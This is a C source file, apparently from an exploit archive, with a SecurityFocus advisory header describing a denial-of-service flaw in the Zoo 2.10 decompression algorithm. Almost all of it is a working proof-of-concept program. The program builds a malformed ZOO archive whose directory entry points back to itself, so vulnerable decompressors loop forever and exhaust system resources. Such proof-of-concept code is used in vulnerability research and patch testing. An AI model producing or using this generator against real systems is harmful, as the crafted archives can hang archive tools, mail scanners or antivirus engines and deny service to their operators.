/*
source: http://www.securityfocus.com/bid/23823/info

The Zoo compression algorithm is prone to a remote denial-of-service vulnerability. This issue arises when applications implementing the Zoo algorithm process certain malformed archives.

A successful attack can exhaust system resources and trigger a denial-of-service condition.

This issue affects Zoo 2.10 and other applications implementing the vulnerable algorithm.
*/

/*

Exploit for the vulnerability:
Multiple vendors ZOO file decompression infinite loop DoS

coded by Jean-S�bastien Guay-Leroux
September 2006

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Structure of a ZOO header

#define ZOO_HEADER_SIZE         0x0000002a

#define ZH_TEXT                 0
#define ZH_TAG                  20
#define ZH_START_OFFSET         24
#define ZH_NEG_START_OFFSET     28
#define ZH_MAJ_VER              32
#define ZH_MIN_VER              33
#define ZH_ARC_HTYPE            34
#define ZH_ARC_COMMENT          35
#define ZH_ARC_COMMENT_LENGTH   39
#define ZH_VERSION_DATA         41


#define D_DIRENTRY_LENGTH       56

#define D_TAG                   0
#define D_TYPE                  4
#define D_PACKING_METHOD        5
#define D_NEXT_ENTRY            6
#define D_OFFSET                10
#define D_DATE                  14
#define D_TIME                  16
#define D_FILE_CRC              18
#define D_ORIGINAL_SIZE         20
#define D_SIZE_NOW              24
#define D_MAJ_VER               28
#define D_MIN_VER               29
#define D_DELETED               30
#define D_FILE_STRUCT           31
#define D_COMMENT_OFFSET        32
#define D_COMMENT_SIZE          36
#define D_FILENAME              38
#define D_VAR_DIR_LEN           51
#define D_TIMEZONE              53
#define D_DIR_CRC               54
#define D_NAMLEN                ( D_DIRENTRY_LENGTH + 0 )
#define D_DIRLEN                ( D_DIRENTRY_LENGTH + 1 )
#define D_LFILENAME             ( D_DIRENTRY_LENGTH + 2 )


void put_byte (char *ptr, unsigned char data) {
        *ptr = data;
}

void put_word (char *ptr, unsigned short data) {
        put_byte (ptr, data);
        put_byte (ptr + 1, data >> 8);
}

void put_longword (char *ptr, unsigned long data) {
        put_byte (ptr, data);
        put_byte (ptr + 1, data >> 8);
        put_byte (ptr + 2, data >> 16);
        put_byte (ptr + 3, data >> 24);
}

FILE * open_file (char *filename) {

        FILE *fp;

        fp = fopen ( filename , "w" );

        if (!fp) {
                perror ("Cant open file");
                exit (1);
        }

        return fp;
}

void usage (char *progname) {

        printf ("\nTo use:\n");
        printf ("%s <archive name>\n\n", progname);

        exit (1);
}

int main (int argc, char *argv[]) {
        FILE *fp;
        char *hdr = (char *) malloc (4096);
        char *filename = (char *) malloc (256);
        int written_bytes;
      int total_size;

        if ( argc != 2) {
                usage ( argv[0] );
        }

        strncpy (filename, argv[1], 255);

        if (!hdr || !filename) {
                perror ("Error allocating memory");
                exit (1);
        }

        memset (hdr, 0x00, 4096);

        // Build a ZOO header
        memcpy          (hdr + ZH_TEXT, "ZOO 2.10 Archive.\032", 18);
        put_longword    (hdr + ZH_TAG, 0xfdc4a7dc);
        put_longword    (hdr + ZH_START_OFFSET, ZOO_HEADER_SIZE);
        put_longword    (hdr + ZH_NEG_START_OFFSET,
            (ZOO_HEADER_SIZE) * -1);
        put_byte        (hdr + ZH_MAJ_VER, 2);
        put_byte        (hdr + ZH_MIN_VER, 0);
        put_byte        (hdr + ZH_ARC_HTYPE, 1);
        put_longword    (hdr + ZH_ARC_COMMENT, 0);
        put_word        (hdr + ZH_ARC_COMMENT_LENGTH, 0);
        put_byte        (hdr + ZH_VERSION_DATA, 3);

        // Build vulnerable direntry struct
        put_longword    (hdr + ZOO_HEADER_SIZE + D_TAG, 0xfdc4a7dc);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_TYPE, 1);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_PACKING_METHOD, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_NEXT_ENTRY, 0x2a);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_OFFSET, 0x71);
        put_word        (hdr + ZOO_HEADER_SIZE + D_DATE, 0x3394);
        put_word        (hdr + ZOO_HEADER_SIZE + D_TIME, 0x4650);
        put_word        (hdr + ZOO_HEADER_SIZE + D_FILE_CRC, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_ORIGINAL_SIZE, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_SIZE_NOW, 0);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_MAJ_VER, 1);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_MIN_VER, 0);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_DELETED, 0);
        put_byte        (hdr + ZOO_HEADER_SIZE + D_FILE_STRUCT, 0);
        put_longword    (hdr + ZOO_HEADER_SIZE + D_COMMENT_OFFSET, 0);
        put_word        (hdr + ZOO_HEADER_SIZE + D_COMMENT_SIZE, 0);
        memcpy          (hdr + ZOO_HEADER_SIZE + D_FILENAME,
                            "AAAAAAAA.AAA", 13);

        total_size = ZOO_HEADER_SIZE + 51;

        fp = open_file (filename);

        if ( (written_bytes = fwrite ( hdr, 1, total_size, fp)) != 0 ) {
                printf ("The file has been written\n");
        } else {
                printf ("Cant write to the file\n");
                exit (1);
        }

        fclose (fp);

        return 0;
}